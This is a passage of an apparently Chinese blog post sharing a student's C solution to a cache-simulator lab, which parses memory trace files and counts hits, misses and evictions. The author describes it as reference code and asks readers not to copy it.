<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><p>该代码仅供参考，很可能并不是一个非常好的解法。如果你也在面对同样的实验，<strong>请不要抄袭</strong>，毕竟抄袭是不会使你变得更强的:)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include necessary headers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"getopt.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unistd.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* cache struct definition */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> valid_bit;</span><br><span class="line">    <span class="keyword">uint64_t</span> tag_bit;</span><br><span class="line">&#125;CSim_Cache_Entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Set</span>&#123;</span></span><br><span class="line">    CSim_Cache_Entry * entries;</span><br><span class="line">&#125;CSim_Cache_Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache</span> &#123;</span></span><br><span class="line">    <span class="comment">/* basic arguments */</span></span><br><span class="line">    <span class="keyword">int</span> block_offset;</span><br><span class="line">    <span class="keyword">int</span> set_number;</span><br><span class="line">    <span class="keyword">int</span> line_number;</span><br><span class="line">    <span class="comment">/* masks and offsets */</span></span><br><span class="line">    <span class="keyword">int</span> tag_offset;</span><br><span class="line">    <span class="keyword">int</span> set_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> tag_mask;</span><br><span class="line">    <span class="keyword">uint64_t</span> set_mask;</span><br><span class="line">    <span class="comment">/* cache */</span></span><br><span class="line">    CSim_Cache_Set * sets;</span><br><span class="line">&#125;CSim_Cache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* simulation result definition */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Result</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> hit;</span><br><span class="line">    <span class="keyword">int</span> miss;</span><br><span class="line">    <span class="keyword">int</span> evict;</span><br><span class="line">&#125;CSim_Cache_Result;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operation type definition */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_TYPE &#123;</span><br><span class="line">    CSIM_OPERATION_TYPE_NONE,</span><br><span class="line">    CSIM_OPERATION_TYPE_MODIFY,</span><br><span class="line">    CSIM_OPERATION_TYPE_LOAD,</span><br><span class="line">    CSIM_OPERATION_TYPE_STORE,</span><br><span class="line">&#125;CSIM_OPERATION_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operation result definition */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_RESULT &#123;</span><br><span class="line">    CSIM_OPERATION_RESULT_MISS,</span><br><span class="line">    CSIM_OPERATION_RESULT_HIT,</span><br><span class="line">    CSIM_OPERATION_RESULT_MISS_EVICTION,</span><br><span class="line">&#125;CSIM_OPERATION_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* error definition */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_ERROR &#123;</span><br><span class="line">    CSIM_OK = <span class="number">0</span>,</span><br><span class="line">    CSIM_ERROR_INVALID_OPTION,</span><br><span class="line">    CSIM_ERROR_MISSING_ARGUMENT,</span><br><span class="line">    CSIM_ERROR_FILE_CANNOT_OPEN,</span><br><span class="line">    CSIM_ERROR_OUT_OF_MEMORY,</span><br><span class="line">&#125;CSIM_ERROR;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* macro definition for get a value given mask and offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> csim_get_value(number, mask, offset) (((number) &amp; (mask)) &gt;&gt; (offset))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* function list */</span></span><br><span class="line"><span class="comment">/* message print functions */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">/* cache structure related functions */</span></span><br><span class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span></span>;</span><br><span class="line"><span class="comment">/* cache simulation function */</span></span><br><span class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* global variable */</span></span><br><span class="line"><span class="keyword">char</span> * program_name = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Options:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -h         Print this help message.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -v         Optional verbose flag.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -s &lt;num&gt;   Number of set index bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -E &lt;num&gt;   Number of lines per set.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -b &lt;num&gt;   Number of block offset bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -t &lt;file&gt;  Trace file.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Examples:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Missing required command line argument\n"</span>, program_name);</span><br><span class="line">    csim_print_help_info();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: No such file or directory\n"</span>, program_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Out of memory\n"</span>, program_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* memory allocation */</span></span><br><span class="line">    CSim_Cache * cache = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CSim_Cache));</span><br><span class="line">    <span class="keyword">if</span> (cache == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        csim_error_out_of_memory();</span><br><span class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* configure basic arguments */</span></span><br><span class="line">    cache-&gt;set_number = set_number;</span><br><span class="line">    cache-&gt;line_number = line_number;</span><br><span class="line">    cache-&gt;block_offset = block_offset;</span><br><span class="line">    <span class="comment">/* caculate masks and offsets */</span></span><br><span class="line">    cache-&gt;tag_mask = ((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (block_offset + set_number);</span><br><span class="line">    cache-&gt;tag_offset = block_offset + set_number;</span><br><span class="line">    cache-&gt;set_mask = ((((((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; block_offset) &lt;&lt; block_offset);</span><br><span class="line">    cache-&gt;set_offset = block_offset;</span><br><span class="line">    <span class="comment">/* memory allocation for cache */</span></span><br><span class="line">    cache-&gt;sets = <span class="built_in">calloc</span>((<span class="number">1</span> &lt;&lt; set_number), <span class="keyword">sizeof</span>(CSim_Cache_Set));</span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;sets == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        csim_error_out_of_memory();</span><br><span class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; (<span class="number">1</span> &lt;&lt; set_number) ; ++index) &#123;</span><br><span class="line">        (cache-&gt;sets)[index].entries = <span class="built_in">calloc</span>(line_number, <span class="keyword">sizeof</span>(CSim_Cache_Entry));</span><br><span class="line">        <span class="keyword">if</span> ((cache-&gt;sets)[index].entries == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            csim_error_out_of_memory();</span><br><span class="line">            <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cache;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* release cache according to construct function */</span></span><br><span class="line">    CSim_Cache * temp = *pcache;</span><br><span class="line">    <span class="keyword">int</span> set_number = temp-&gt;set_number;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; set_number ; ++index) &#123;</span><br><span class="line">        <span class="built_in">free</span>((temp-&gt;sets)[index].entries);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(temp-&gt;sets);</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    *pcache = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* file I/O related */</span></span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">80</span>];</span><br><span class="line">    <span class="keyword">char</span> * line_pointer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* cache type and cache result */</span></span><br><span class="line">    CSIM_OPERATION_TYPE type;</span><br><span class="line">    CSIM_OPERATION_RESULT result;</span><br><span class="line">    <span class="comment">/* address and set index &amp; tag bis from it */</span></span><br><span class="line">    <span class="keyword">int</span> address = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">set</span> = <span class="number">0</span>, tag = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* line number */</span></span><br><span class="line">    <span class="keyword">int</span> line_number = cache-&gt;line_number;</span><br><span class="line">    <span class="comment">/* simulation result */</span></span><br><span class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">/* parsing process */</span></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="number">80</span>, file_pointer), feof(file_pointer) == <span class="number">0</span>) &#123;</span><br><span class="line">        line_pointer = line;</span><br><span class="line">        type = CSIM_OPERATION_TYPE_NONE;</span><br><span class="line">        <span class="comment">/* exclude instrction load */</span></span><br><span class="line">        <span class="keyword">if</span> (*line_pointer++ == <span class="string">' '</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(*line_pointer++) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">                    type = CSIM_OPERATION_TYPE_LOAD;</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">putchar</span>(<span class="string">'L'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                    type = CSIM_OPERATION_TYPE_STORE;</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">putchar</span>(<span class="string">'S'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                    type = CSIM_OPERATION_TYPE_MODIFY;</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">putchar</span>(<span class="string">'M'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    type = CSIM_OPERATION_TYPE_NONE;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result = CSIM_OPERATION_RESULT_MISS_EVICTION;</span><br><span class="line">            <span class="built_in">sscanf</span>(line_pointer, <span class="string">"%x"</span>, &amp;address);</span><br><span class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((*line_pointer) != <span class="string">'\n'</span>) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(*line_pointer++);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* separate set and tag according to mask and offset */</span></span><br><span class="line">            <span class="built_in">set</span> = csim_get_value(address, cache-&gt;set_mask, cache-&gt;set_offset);</span><br><span class="line">            tag = csim_get_value(address, cache-&gt;tag_mask, cache-&gt;tag_offset);</span><br><span class="line">            <span class="comment">/* determine the cache result */</span></span><br><span class="line">            CSim_Cache_Entry * pentry = (cache-&gt;sets)[<span class="built_in">set</span>].entries;</span><br><span class="line">            <span class="keyword">int</span> index;</span><br><span class="line">            CSim_Cache_Entry temp;</span><br><span class="line">            <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; line_number ; ++index) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pentry[index].valid_bit) &#123;</span><br><span class="line">                    result = CSIM_OPERATION_RESULT_MISS;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (pentry[index].tag_bit == tag) &#123;</span><br><span class="line">                    result = CSIM_OPERATION_RESULT_HIT;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* simulate according to the result of cache behavior */</span></span><br><span class="line">            <span class="keyword">switch</span>(result) &#123;</span><br><span class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS:</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    pentry[index].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    pentry[index].tag_bit = tag;</span><br><span class="line">                    summary.miss++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS_EVICTION:</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">" miss eviction"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    pentry[<span class="number">0</span>].tag_bit = tag;</span><br><span class="line">                    temp = pentry[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">for</span> (index = <span class="number">0</span> ; index &lt; line_number - <span class="number">1</span> ; ++index) &#123;</span><br><span class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    pentry[index] = temp;</span><br><span class="line">                    summary.miss++;</span><br><span class="line">                    summary.evict++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_HIT:</span><br><span class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    temp = pentry[index];</span><br><span class="line">                    <span class="keyword">for</span> ( ; (index &lt; line_number - <span class="number">1</span>) &amp;&amp; (pentry[index + <span class="number">1</span>].valid_bit) ; ++index) &#123;</span><br><span class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    pentry[index] = temp;</span><br><span class="line">                    summary.hit++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (type == CSIM_OPERATION_TYPE_MODIFY) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                summary.hit++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> summary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* variables for argument parsing */</span></span><br><span class="line">    <span class="keyword">char</span> h = <span class="number">0</span>, v = <span class="number">0</span>, s = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    <span class="comment">/* cache arguments */</span></span><br><span class="line">    <span class="keyword">int</span> set_number = <span class="number">0</span>, line_number = <span class="number">0</span>, block_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* cache */</span></span><br><span class="line">    CSim_Cache * cache = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* file path */</span></span><br><span class="line">    <span class="keyword">char</span> file_path[<span class="number">80</span>];</span><br><span class="line">    <span class="comment">/* verbose flag */</span></span><br><span class="line">    <span class="keyword">char</span> verbose_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* summary */</span></span><br><span class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">/* pre-operation */</span></span><br><span class="line">    program_name = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">/* argument parsing */</span></span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">                h = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                v = <span class="number">1</span>;</span><br><span class="line">                verbose_flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                set_number = atoi(optarg);</span><br><span class="line">                <span class="keyword">if</span> (set_number == 